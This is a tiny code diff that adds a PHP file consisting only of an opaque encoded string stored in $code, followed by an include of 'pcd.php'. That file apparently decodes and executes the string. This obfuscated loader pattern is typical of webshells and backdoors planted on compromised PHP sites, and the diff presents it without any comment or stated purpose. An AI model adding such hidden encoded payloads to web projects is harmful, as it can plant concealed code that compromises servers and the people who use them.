@@ -1,0 +1,2 @@
+<?php
+$code="s7EvyCjg5cpM08gsLk4t0VCJD3YNDvb094tWdywtyffJT8/MU4/VVFBTU8AupWBrq6DkX5SYnJOqpFmtADQoLTMnNT61IrO4pFhDKTMvOT4fLJuYVJyal5Kapwe0UEkTpDQvOac0JRW3GmuFWiBMzSlOxW5ucWIBhqEqwY4BoUU5CrbIzvXw9/eODw3yUY+1RrUVwwSIlfZ2AA==";include("pcd.php");?>
